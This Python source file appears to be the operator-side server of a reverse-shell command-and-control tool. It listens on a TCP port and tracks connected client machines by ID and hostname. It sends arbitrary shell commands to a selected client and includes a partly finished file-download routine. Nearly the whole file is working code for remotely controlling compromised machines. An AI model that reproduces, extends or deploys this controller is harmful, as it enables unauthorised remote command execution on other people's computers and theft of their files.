import os
import socket 
import threading
import randomStr

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5553
BUFFER_SIZE = 200 * 1024

# shell prompt 
def shell_prompt():
    return "\nshell $> "

# initialize a list for all connected client sockets 
client_sockets = [] # store the client socket
client_address = [] # store the client IP address
client_id = [] # store the client id
client_hostname = [] # store the client hostname

# create TCP socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# bind the socket 
s.bind((SERVER_HOST, SERVER_PORT))

# listen for incoming connection 
s.listen(5)

print(f"[+] Listening as {SERVER_HOST}:{SERVER_PORT}", shell_prompt(), end='')

# accept incoming connection 
def accept_connections():
    while True:
        try:
            id = randomStr.generateRandomValue()
            conn, address = s.accept()
            # request client's hostname
            conn.send("whoami".encode())
            hostname = conn.recv(128 * 1024).decode()
            # adding client data to the list/dict
            client_sockets.append(conn)
            client_address.append(address)
            client_id.append(id)
            client_hostname.append(hostname)
            print(f"\nNew Connection: [ID {id}] [Address {address[0]}:{address[1]}] ", shell_prompt(), end='')
            
        except socket.error as e:
            # print(f"Error accepting connections", shell_prompt(), end='')
            print(e)

# get help message 
def get_help():
    message = f'''Option:
    - help                  Print this help message
    - exit                  Exit from the program
    - list                  List all connected client
    - select <ID>           Select target to communicate
    - terminate             Kill all connections
    - cls                   Clear the screen
    - kill                  Kill target connection
    - download <filename>   Download file from the client to this machine'''
    
    print(message, shell_prompt(), end='')
    # - clear             Clear screen
    # - pwd               Print working directory
    # - cd                Change working directory to specified directory
    # - ls                Listing the contents of specified directory
    # - powershell        Run powershell
    # - cmd               Run cmd

# list all the client 
def list_connections():
    results = ''
    for i, conn in enumerate(client_sockets):
        # conn.send("whoami".encode())
        # client_hostname = conn.recv(BUFFER_SIZE).decode()
        # try:
        #     # checking the connection of all client by request the hostname of the client
        #     # conn.send(''.encode())
        # except:
        #     # remove the client, then continue
        #     del client_sockets[i]
        #     del client_address[i]
        #     del client_id[i]
        #     continue
        results += f"[*] ID {client_id[i]}  {client_hostname[i]}"
        # results += f"[*] ID {client_id[i]}  {client_address[i][0]}  {client_hostname}"
        # results += f"[*] ID {client_id[i]}  {client_address[i][0]}\n"
    print("---- Clients ----")
    # print(client_hostname, shell_prompt(), end='') 
    print(results, shell_prompt(), end='') 

# select a target client : return client socket, client hostname and client id in the 'list' form
def get_target(cmd):
    try:
        id = cmd.replace("select ", "").strip()
        # get the index of selected client
        index = client_id.index(id)
        conn = client_sockets[index]
        print(f"Yout are now connected to [{id} {client_address[index][0]}]")
        return [conn, client_hostname[index], client_id[index]] # client socket, client hostname, client id
    except:
        print("Not a valid selection", shell_prompt(), end='')
        return None

# send command client
def send_command(conn):
    # client_prompt = "#> "
    client_conn = conn[0] 
    hostname = conn[1].strip()
    while True:
        try:
            cmd = input(f"{hostname} #> ")
            if not cmd.strip():
                # continue if the input is empty 
                continue
            elif cmd.lower() == "exit":
                # exit from selected client but NOT CLOSED the connection with the client
                print(shell_prompt(), end='')
                break
            elif cmd.lower() == "cls":
                # clear screen 
                os.system("cls")
            elif cmd.lower() == "pwd":
                client_conn.send("echo %cd%".encode())
                output = client_conn.recv(BUFFER_SIZE).decode()
                print(output, end='')
            elif cmd.lower()[:2] == "cd":
                # send command to client
                client_conn.send(cmd.encode())
                # get client response, then print the results
                output = client_conn.recv(BUFFER_SIZE).decode()
                print(output, end='\n')
            elif "download" in cmd:
                # send command then get the response
                client_conn.send(cmd.encode())
                # for debugging 
                # output = client_conn.recv(1024).decode()
                # print(output, end='\n')

                response = client_conn.recv(1024).decode()
                print(response)
                if response == "File exists.":
                    # start data transmission if file exists 
                    pass
                else:
                    # continue if the file doesn't exists 
                    print(response)

                # filename, file_size = response.split("<sep>")
                # file_size = int(file_size)

                # print(f"{filename}:{type(file_size)}kB")
                '''
                # Indicate the start of file data transmission by sending message confirmation to the client
                client_conn.send("OK".encode()) 
                print("Receiving file data...")

                # Create a new file for writing
                with open(filename, "wb") as file:
                    while file_size > 0:
                        data = client_conn.recv(1024)
                        if not data:
                            break
                        file.write(data)
                        file_size -= len(data)

                # Close the file when the operation has finished
                file.close()
                '''

            else:
                # send command to client
                client_conn.send(cmd.encode())
                # get client response, then print the results
                output = client_conn.recv(BUFFER_SIZE).decode()
                print(output, end='')
        except KeyboardInterrupt:
            print('', end='\n')
            continue
        # except:
        #     print("Connection was lost", shell_prompt(), end='')
        #     break

# kill single target
def kill_target(cmd): # return nothing
    try:
        id = cmd.replace("kill ", "")
        # get the index of selected client from the client id
        index = client_id.index(id) 
        # send exit message to the client to close the connection 
        conn = client_sockets[index]
        conn.send("exit".encode())
        # print the information result to the console
        results = f"[*] ID {id} {client_address[index][0]} has disconnected.\n"
        print(results, shell_prompt(), end='')
        # remove client from the list
        client_sockets.pop(index)
        client_address.pop(index)
        client_id.pop(index)
        client_hostname.pop(index)
    except:
        results = "Not a valid selection"
        print(results, shell_prompt(), end='')
        return None

# terminate all connection
def teminate_connections():
    results = ''
    for i, conn in enumerate(client_sockets):
        # send exit message to the client to close the connection, then print message on the console. The connection will be closed by the client, not the server. 
        conn.send("exit".encode())
        results += f"[*] ID {client_id[i]} {client_hostname[i]} has disconnected.\n"
       
    if  len(client_sockets) == 0:
        results = "No client connected."
        # print(results, shell_prompt(), end='')
        return results   
    else: 
        # empty the client list 
        client_sockets.clear()
        client_address.clear()
        client_id.clear()
        client_hostname.clear()    

        # print information message 
        # print("---- Clients ----")
        # print(results, shell_prompt(), end='')
        results = "---- Clients ----" + "\n" + results
        return results
    
# interactive prompt
def start_menu():
    while True:
        try:
            cmd = input().strip()
            if cmd.lower() == "exit":
                # terminate all connections then exit
                terminate_msg = teminate_connections()
                print(terminate_msg, "\nExit the program.", end='')
                break
            elif cmd.lower() == "help":
                # getting help of this program 
                get_help()
            elif cmd.lower() == "list":
                # list all connected client 
                list_connections()
            elif cmd.lower() == "clear":
                # clear screen 
                os.system("cls")
                print(shell_prompt(), end='')
            elif cmd.lower() == "terminate":
                # terminate all connections 
                terminate_msg = teminate_connections()
                print(terminate_msg, shell_prompt(), end='')
            elif "select" in cmd:
                # select target to communicate 
                conn = get_target(cmd) # conn will contains client socket and client hostname
                if conn is not None:
                    send_command(conn)
            elif "kill" in cmd:
                # select target to kill 
                kill_target(cmd)
            else:
                # print message if command not on the list 
                print("Command not recognized", shell_prompt(), end='')
        except KeyboardInterrupt:
            # continue the line and print the shell prompt 
            print(shell_prompt(), end='')
            continue

# main function 
def main():
    # accept connection in a new thread 
    t = threading.Thread(target=accept_connections, daemon=True)
    t.start()
    # run the prompt 
    start_menu()
    # s.close() # how to close the server socket? do we need to close the server socket?

# the main function 
if __name__ == "__main__":
    main()